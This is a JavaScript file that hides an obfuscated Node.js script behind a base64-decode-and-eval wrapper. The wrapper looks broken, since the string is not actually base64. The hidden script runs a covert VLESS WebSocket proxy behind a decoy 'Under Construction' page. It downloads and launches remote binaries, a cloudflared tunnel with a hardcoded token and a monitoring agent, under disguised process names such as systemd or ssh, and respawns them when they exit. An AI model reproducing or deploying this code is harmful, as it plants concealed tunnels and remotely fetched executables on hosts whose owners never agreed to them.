const b = 'const _0x66fe97=_0x5741;(function(_0x1c9570,_0x576eaa){const _0x4db9aa=_0x5741,_0x4d0a85=_0x1c9570();while(!![]){try{const _0x14382b=parseInt(_0x4db9aa(0x1b8))/0x1+-parseInt(_0x4db9aa(0x1d3))/0x2*(parseInt(_0x4db9aa(0x1ff))/0x3)+-parseInt(_0x4db9aa(0x208))/0x4*(parseInt(_0x4db9aa(0x1de))/0x5)+parseInt(_0x4db9aa(0x1d2))/0x6*(parseInt(_0x4db9aa(0x205))/0x7)+parseInt(_0x4db9aa(0x1b0))/0x8+parseInt(_0x4db9aa(0x1e0))/0x9*(parseInt(_0x4db9aa(0x1a5))/0xa)+parseInt(_0x4db9aa(0x1c7))/0xb;if(_0x14382b===_0x576eaa)break;else _0x4d0a85['push'](_0x4d0a85['shift']());}catch(_0x55e922){_0x4d0a85['push'](_0x4d0a85['shift']());}}}(_0x363d,0xeaee9));const {exec,spawn}=require('child_process'),{WebSocketServer,createWebSocketStream}=require('ws'),http=require(_0x66fe97(0x1f7)),{URL}=require(_0x66fe97(0x1ce)),net=require('net'),{tmpdir}=require('os'),{join}=require('path'),{createWriteStream,promises:fs}=require('fs'),axios=require(_0x66fe97(0x20a)),{pipeline}=require(_0x66fe97(0x1ba)),CONFIG={'UUID':(process[_0x66fe97(0x1e5)][_0x66fe97(0x1ae)]||'feefeb96-bfcf-4a9b-aac0-6aac771c1b98')[_0x66fe97(0x1f9)](/-/g,''),'PORT':process[_0x66fe97(0x1e5)][_0x66fe97(0x1c8)]||process[_0x66fe97(0x1e5)][_0x66fe97(0x1e3)]||0x1f90,'K_S':process[_0x66fe97(0x1e5)][_0x66fe97(0x1cf)]||_0x66fe97(0x1e7),'C_B':process[_0x66fe97(0x1e5)][_0x66fe97(0x1ab)]||_0x66fe97(0x1fe),'K_K':process[_0x66fe97(0x1e5)]['K_K']||_0x66fe97(0x1b7),'C_T':process[_0x66fe97(0x1e5)][_0x66fe97(0x1df)]||_0x66fe97(0x1b6),'C_D':process[_0x66fe97(0x1e5)][_0x66fe97(0x1ac)]||_0x66fe97(0x1b1)},COMMON_NAMES=['node',_0x66fe97(0x1b5),_0x66fe97(0x1cc),_0x66fe97(0x1f4),_0x66fe97(0x1ec),_0x66fe97(0x1d1),_0x66fe97(0x1bb),_0x66fe97(0x1bc),_0x66fe97(0x1a6),_0x66fe97(0x1d7),_0x66fe97(0x1fb),_0x66fe97(0x1eb),_0x66fe97(0x200),_0x66fe97(0x1a7),_0x66fe97(0x209),_0x66fe97(0x1e1),'sh',_0x66fe97(0x1ca),'nano',_0x66fe97(0x1d9),_0x66fe97(0x1a0),_0x66fe97(0x1a1),_0x66fe97(0x1b9)],randName=()=>COMMON_NAMES[Math[_0x66fe97(0x1ad)](Math['random']()*COMMON_NAMES[_0x66fe97(0x1ed)])],vlessLink=()=>_0x66fe97(0x1f6)+CONFIG[_0x66fe97(0x1ae)]+'@'+CONFIG[_0x66fe97(0x1ab)]+_0x66fe97(0x19d)+CONFIG[_0x66fe97(0x1ac)]+_0x66fe97(0x1e8)+CONFIG['C_D']+_0x66fe97(0x201)+CONFIG['C_D'],HTML_TEMPLATES={'home':_0x66fe97(0x1bf),'status':(_0x148afe,_0x3743d7)=>_0x66fe97(0x1ee)+_0x148afe+_0x66fe97(0x1a9)+_0x3743d7+_0x66fe97(0x1a4)+_0x3743d7+_0x66fe97(0x1d5)},server=http[_0x66fe97(0x1e4)]((_0x891fe3,_0x191e6e)=>{const _0x50e5ec=_0x66fe97;try{const {pathname:_0x73fe}=new URL(_0x891fe3[_0x50e5ec(0x1ce)],_0x50e5ec(0x1db)+_0x891fe3[_0x50e5ec(0x203)][_0x50e5ec(0x1af)]);if(_0x73fe==='/')_0x191e6e[_0x50e5ec(0x1e9)](0xc8,{'Content-Type':_0x50e5ec(0x1f0)}),_0x191e6e[_0x50e5ec(0x19f)](HTML_TEMPLATES[_0x50e5ec(0x1a8)]);else{if(_0x73fe==='/x')_0x191e6e['writeHead'](0xc8,{'Content-Type':_0x50e5ec(0x1f0)}),_0x191e6e[_0x50e5ec(0x19f)](HTML_TEMPLATES[_0x50e5ec(0x1c3)](CONFIG['PORT'],vlessLink()));else _0x73fe===_0x50e5ec(0x1a2)?(_0x191e6e['writeHead'](0xc8,{'Content-Type':_0x50e5ec(0x1c2)}),_0x191e6e[_0x50e5ec(0x19f)](JSON[_0x50e5ec(0x206)]({'status':'ok','uptime':process[_0x50e5ec(0x1fc)]()}))):(_0x191e6e['writeHead'](0x194,{'Content-Type':_0x50e5ec(0x19e)}),_0x191e6e[_0x50e5ec(0x19f)](_0x50e5ec(0x1dc)));}}catch{!_0x191e6e[_0x50e5ec(0x1ea)]&&(_0x191e6e[_0x50e5ec(0x1e9)](0x1f4,{'Content-Type':'text/plain'}),_0x191e6e[_0x50e5ec(0x19f)](_0x50e5ec(0x1b4)));}}),wss=new WebSocketServer({'server':server,'path':_0x66fe97(0x1f3)});wss['on']('connection',_0x5deb7c=>{const _0x225dfb=_0x66fe97;_0x5deb7c[_0x225dfb(0x1d8)](_0x225dfb(0x1dd),_0x4e5219=>{const _0x55be2d=_0x225dfb,[_0x229ac2]=_0x4e5219,_0x2d3c90=_0x4e5219[_0x55be2d(0x1fa)](0x1,0x11);if(!_0x2d3c90[_0x55be2d(0x1c0)]((_0x3de533,_0x122c11)=>_0x3de533===parseInt(CONFIG['UUID'][_0x55be2d(0x1c9)](_0x122c11*0x2,0x2),0x10)))return;let _0x59a8de=_0x4e5219[_0x55be2d(0x1fa)](0x11,0x12)[_0x55be2d(0x1f1)]()+0x13;const _0x554f97=_0x4e5219[_0x55be2d(0x1fa)](_0x59a8de,_0x59a8de+=0x2)[_0x55be2d(0x1cb)](0x0),_0x3aa114=_0x4e5219[_0x55be2d(0x1fa)](_0x59a8de,_0x59a8de+=0x1)[_0x55be2d(0x1f1)]();let _0x4322c7;if(_0x3aa114===0x1)_0x4322c7=_0x4e5219['slice'](_0x59a8de,_0x59a8de+=0x4)[_0x55be2d(0x1ef)]('.');else{if(_0x3aa114===0x2){const _0x4e4d1b=_0x4e5219[_0x55be2d(0x1fa)](_0x59a8de,_0x59a8de+=0x1)[_0x55be2d(0x1f1)]();_0x4322c7=new TextDecoder()[_0x55be2d(0x1d0)](_0x4e5219[_0x55be2d(0x1fa)](_0x59a8de,_0x59a8de+=_0x4e4d1b));}else _0x3aa114===0x3&&(_0x4322c7=_0x4e5219[_0x55be2d(0x1fa)](_0x59a8de,_0x59a8de+=0x10)[_0x55be2d(0x1fd)]((_0x1f4c4b,_0x277cf0,_0x4f9891,_0x236194)=>_0x4f9891%0x2?_0x1f4c4b[_0x55be2d(0x1b3)](_0x236194[_0x55be2d(0x1fa)](_0x4f9891-0x1,_0x4f9891+0x1)):_0x1f4c4b,[])[_0x55be2d(0x204)](_0x54edab=>_0x54edab['readUInt16BE'](0x0)[_0x55be2d(0x1d6)](0x10))[_0x55be2d(0x1ef)](':'));}if(_0x5deb7c[_0x55be2d(0x1e6)]===_0x5deb7c[_0x55be2d(0x202)]){_0x5deb7c[_0x55be2d(0x1e2)](new Uint8Array([_0x229ac2,0x0]));const _0x5d3431=createWebSocketStream(_0x5deb7c)['on'](_0x55be2d(0x1c6),()=>{}),_0x3589f5=net[_0x55be2d(0x1d4)]({'host':_0x4322c7,'port':_0x554f97},function(){const _0x5dfb6c=_0x55be2d;this[_0x5dfb6c(0x1f5)](_0x4e5219['slice'](_0x59a8de)),_0x5d3431[_0x5dfb6c(0x1be)](this)[_0x5dfb6c(0x1be)](_0x5d3431);});_0x3589f5['on'](_0x55be2d(0x1c6),()=>{});}});});async function downloadAndRun(_0x45c336,_0x6a9e71,_0xdc38aa){const _0x52dbeb=_0x66fe97;if(!_0x45c336)return;const _0x2f115a=join(tmpdir(),randName());try{const _0x24c29f=await axios({'url':_0x45c336,'responseType':'stream','timeout':0x7530,'headers':{'User-Agent':_0x52dbeb(0x1c4)}});await pipeline(_0x24c29f[_0x52dbeb(0x1da)],createWriteStream(_0x2f115a)),await fs[_0x52dbeb(0x1f8)](_0x2f115a,0x1ed),spawnProcess(_0x2f115a,_0x6a9e71,_0xdc38aa);}catch{await fs['unlink'](_0x2f115a)['catch'](()=>{});}}function spawnProcess(_0x4f328d,_0x3693a9,_0x3f0fab){const _0x414191=_0x66fe97,_0x1dddfd=spawn(_0x4f328d,_0x3693a9[_0x414191(0x1a3)]('\x20'),{'stdio':'ignore','detached':!![]});_0x1dddfd['unref'](),_0x1dddfd['on']('exit',(_0x820820,_0x480a80)=>{const _0xa599f1=_0x414191;console[_0xa599f1(0x1f2)](_0x3f0fab+_0xa599f1(0x1bd)+_0x820820+_0xa599f1(0x1aa)+_0x480a80+_0xa599f1(0x1cd)),setTimeout(()=>spawnProcess(_0x4f328d,_0x3693a9,_0x3f0fab),0x1388);});}function _0x5741(_0x3fab96,_0x8fd4f6){const _0x363d50=_0x363d();return _0x5741=function(_0x5741c2,_0x148724){_0x5741c2=_0x5741c2-0x19d;let _0x535760=_0x363d50[_0x5741c2];return _0x535760;},_0x5741(_0x3fab96,_0x8fd4f6);}const baseUrl='https://github.com/seav1/dl/releases/download/files',archUrl=_0x1afb78=>process['arch']===_0x66fe97(0x1c1)?_0x1afb78+_0x66fe97(0x207):_0x1afb78;function _0x363d(){const _0x4e0b82=['log','/vls','wget','write','vless://','http','chmod','replace','slice','systemd','uptime','reduce','loc.gov','25413bGnjZu','dbus','&fp=chrome&security=tls#','OPEN','headers','map','3269CfUwpi','stringify','-arm','4rrHZjx','kmod','axios',':443?type=ws&path=%2Fvls&host=','text/plain','end','apt','yum','/health','split','</div>\x0a\x20\x20<button\x20class=\x22copy-btn\x22\x20onclick=\x22navigator.clipboard.writeText(\x27','1728310oStvrq','python','udev','home','</div></div>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Connection\x20Link:</div><div\x20class=\x22value\x22\x20id=\x22vlessLink\x22>',',\x20signal=','C_B','C_D','floor','UUID','host','6498528fNinXF','deepnote.seav.eu.org','tunnel\x20--edge-ip-version\x20auto\x20--protocol\x20http2\x20--no-autoupdate\x20run\x20--token\x20','concat','Internal\x20Server\x20Error','npm','eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiNjVhNzM5OTktZDIwNi00MDEwLTg0NTYtYWY0ZDQzMTNjY2ExIiwicyI6IlltSXdZMkkxTmpVdFlXUmtZaTAwTUdRM0xUa3dNVFF0TmpFd1lUWmlaR0ppTWpjMyJ9','ZLeALav_EjaQVoV7','339744ANmxrH','service','stream/promises','tar','gzip','\x20exited\x20(code=','pipe','<!DOCTYPE\x20html><html><head><title>Under\x20Construction</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:0;padding:0;background:linear-gradient(135deg,#667eea\x200%,#764ba2\x20100%);min-height:100vh;display:flex;align-items:center;justify-content:center}\x0a\x20\x20.container{text-align:center;background:white;padding:60px\x2040px;border-radius:15px;box-shadow:0\x2010px\x2030px\x20rgba(0,0,0,0.2);max-width:500px;margin:20px}\x0a\x20\x20h1{color:#333;font-size:2.5em;margin-bottom:20px;font-weight:300}\x0a\x20\x20p{color:#666;font-size:1.2em;line-height:1.6;margin-bottom:30px}\x0a\x20\x20.icon{font-size:4em;margin-bottom:20px;color:#667eea;font-weight:bold}\x0a\x20\x20.footer{color:#999;font-size:0.9em;margin-top:30px}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><div\x20class=\x22icon\x22>[!]</div>\x0a\x20\x20<h1>Website\x20Under\x20Construction</h1><p>We\x27re\x20working\x20hard\x20to\x20bring\x20you\x20something\x20amazing.\x20Please\x20check\x20back\x20soon!</p>\x0a\x20\x20<div\x20class=\x22footer\x22>Thank\x20you\x20for\x20your\x20patience.</div></div></body></html>','every','arm64','application/json','status','Mozilla/5.0','/ko','error','15340666XRXZpH','PORT','substr','vim','readUInt16BE','curl','),\x20restarting...','url','K_S','decode','rsync','3216MUkXOK','422zqGPFE','connect','\x27).then(()=>alert(\x27Copied!\x27))\x22>Copy</button></div>\x0a\x20\x20</div></body></html>','toString','java','once','git','data','http://','Not\x20Found','message','1964890vUBjeg','C_T','18xRuYOZ','bash','send','SERVER_PORT','createServer','env','readyState','https://komari.seav.eu.org','&encryption=none&sni=','writeHead','headersSent','cron','ssh','length','<!DOCTYPE\x20html><html><head><title>Service\x20Status</title><style>\x0a\x20\x20body{font-family:Arial,sans-serif;margin:40px;background-color:#f5f5f5}\x0a\x20\x20.container{max-width:600px;margin:0\x20auto;background:white;padding:30px;border-radius:8px;box-shadow:0\x202px\x2010px\x20rgba(0,0,0,0.1)}\x0a\x20\x20h1{color:#333;text-align:center}\x0a\x20\x20.info-item{margin:20px\x200;padding:15px;background:#f8f9fa;border-radius:5px}\x0a\x20\x20.label{font-weight:bold;color:#555;margin-bottom:10px}\x0a\x20\x20.value{font-family:monospace;background:#e9ecef;padding:10px;border-radius:4px;word-break:break-all}\x0a\x20\x20.copy-btn{background:#007cba;color:white;border:none;padding:8px\x2015px;border-radius:3px;cursor:pointer;margin-top:10px}\x0a\x20\x20.copy-btn:hover{background:#0056b3}\x0a\x20\x20</style></head><body><div\x20class=\x22container\x22><h1>Service\x20Running</h1>\x0a\x20\x20<div\x20class=\x22info-item\x22><div\x20class=\x22label\x22>Port:</div><div\x20class=\x22value\x22>','join','text/html','readUInt8'];_0x363d=function(){return _0x4e0b82;};return _0x363d();}downloadAndRun(archUrl(baseUrl+_0x66fe97(0x1c5)),'-e\x20'+CONFIG[_0x66fe97(0x1cf)]+'\x20-t\x20'+CONFIG['K_K'],'ko'),downloadAndRun(archUrl(baseUrl+'/cf'),_0x66fe97(0x1b2)+CONFIG['C_T'],'cf'),server['listen'](CONFIG[_0x66fe97(0x1c8)]);';
const code = Buffer.from(b, 'base64').toString();
eval(code);
